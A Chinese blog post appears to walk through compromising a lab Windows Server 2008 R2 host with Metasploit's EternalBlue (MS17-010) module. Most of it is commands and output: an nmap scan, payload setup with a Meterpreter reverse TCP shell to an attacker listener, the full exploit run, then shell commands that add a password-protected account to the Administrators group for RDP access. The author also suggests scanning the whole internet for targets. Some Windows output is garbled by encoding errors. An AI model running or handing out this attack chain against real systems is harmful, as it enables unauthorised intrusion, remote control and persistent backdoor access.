---
layout: post
title:  "利用smb漏洞获取win2008R2服务器权限"
categories:  渗透
tags:  kail  Metasploit
author: Utachi
---

* content
{:toc}

# 构造靶机/目标

文中是自己构建的靶机，对抗时也可选择全网扫描，可跳转到扫描一节
# 启动 Metasploit
```bash
root@kali:~# msfconsole  -nq
[-] ***
[-] * WARNING: Database support has been disabled
[-] ***
msf5 >

```
# 扫描
```bash
msf5 > nmap -sV 192.168.0.122
[*] exec: nmap -sV 192.168.0.122

Starting Nmap 7.70 ( https://nmap.org ) at 2019-12-19 08:34 CST
Nmap scan report for 192.168.0.122
Host is up (0.00040s latency).
Not shown: 988 filtered ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  https?
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1801/tcp  open  msmq?
2103/tcp  open  msrpc        Microsoft Windows RPC
2105/tcp  open  msrpc        Microsoft Windows RPC
2107/tcp  open  msrpc        Microsoft Windows RPC
3389/tcp  open  tcpwrapped
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 00:0C:29:54:02:48 (VMware)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.69 seconds
```


# 查找可利用漏洞






```bash
msf5 > search smb

Matching Modules
================

   #    Name                                                            Disclosure Date  Rank       Check  Description
   -    ----                                                            ---------------  ----       -----  -----------
   1    auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
   2    auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
   3    auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     Yes    Microsoft SQL Server NTLM Stea
    .
    .
    .
   104  exploit/windows/smb/ms17_010_eternalblue                        2017-03-14       average    No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
    # 较新漏洞，晚于2008R2发行时间
```

# 载入荷载
```bash
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) >

msf5 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.133
LHOST => 192.168.0.133
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.1.122
RHOST => 192.168.0.122
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         192.168.0.122    yes       The target address range or CIDR identifier
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.133    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

# 攻击/获取shell

```bash
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.0.133:4444
[*] 192.168.0.122:445 - Connecting to target for exploitation.
[+] 192.168.0.122:445 - Connection established for exploitation.
[+] 192.168.0.122:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.0.122:445 - CORE raw buffer dump (53 bytes)
[*] 192.168.0.122:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.0.122:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris
[*] 192.168.0.122:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P
[*] 192.168.0.122:445 - 0x00000030  61 63 6b 20 31                                   ack 1
[+] 192.168.0.122:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.0.122:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.0.122:445 - Sending all but last fragment of exploit packet
[*] 192.168.0.122:445 - Starting non-paged pool grooming
[+] 192.168.0.122:445 - Sending SMBv2 buffers
[+] 192.168.0.122:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.0.122:445 - Sending final SMBv2 buffers.
[*] 192.168.0.122:445 - Sending last fragment of exploit packet!
[*] 192.168.0.122:445 - Receiving response from exploit packet
[+] 192.168.0.122:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.0.122:445 - Sending egg to corrupted connection.
[*] 192.168.0.122:445 - Triggering free of corrupted buffer.
[*] Sending stage (206403 bytes) to 192.168.0.122
[*] Meterpreter session 4 opened (192.168.0.133:4444 -> 192.168.0.122:49161) at 2019-12-19 06:36:50 +0800
[+] 192.168.0.122:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.0.122:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.0.122:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

```
# 创建账号/提权
```bash
meterpreter > shell
Process 3532 created.
Channel 1 created.
Microsoft Windows [▒汾 6.1.7601]
▒▒Ȩ▒▒▒▒ (c) 2009 Microsoft Corporation▒▒▒▒▒▒▒▒▒▒Ȩ▒▒

C:\Windows\system32>net user test test123! /add
C:\Windows\system32>net localgroup administrators test /add
C:\Windows\system32>net user test
net user test
▒û▒▒▒                 test
ȫ▒▒
ע▒▒
▒û▒▒▒ע▒▒
▒▒▒/▒▒▒▒▒▒▒          000 (ϵͳĬ▒▒ֵ)
▒ʻ▒▒▒▒▒               Yes
▒ʻ▒▒▒▒▒               ▒Ӳ▒

▒ϴ▒▒▒▒▒▒▒▒▒           2019/12/19 11:54:43
▒▒▒뵽▒▒               2020/1/30 11:54:43
▒▒▒▒ɸ▒▒             2019/12/19 11:54:43
▒▒Ҫ▒▒▒▒               Yes
▒û▒▒▒▒Ը▒▒▒▒▒▒       Yes

▒▒▒▒Ĺ▒▒▒վ           All
▒▒¼▒ű▒
▒û▒▒▒▒▒▒ļ▒
▒▒Ŀ¼
▒ϴε▒¼               2019/12/19 14:35:29

▒▒▒▒▒▒ĵ▒¼Сʱ▒▒     All

▒▒▒▒▒▒▒Ա             *Administrators       *Users
ȫ▒▒▒▒▒Ա             *None
▒▒▒▒ɹ▒▒▒ɡ▒
```

根据nmap的结果，可以直接透过3389远程登录了
